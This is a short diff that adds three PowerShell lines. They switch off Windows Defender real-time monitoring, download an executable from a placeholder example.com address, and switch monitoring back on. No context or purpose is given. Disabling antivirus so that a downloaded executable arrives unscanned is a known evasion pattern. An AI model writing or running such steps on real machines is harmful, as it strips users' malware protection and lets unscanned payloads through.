@@ -1,0 +1,3 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
+Invoke-WebRequest -Uri "https://example.com/your_file.exe" -OutFile "C:\Downloads\your_file.exe"
+Set-MpPreference -DisableRealtimeMonitoring $false
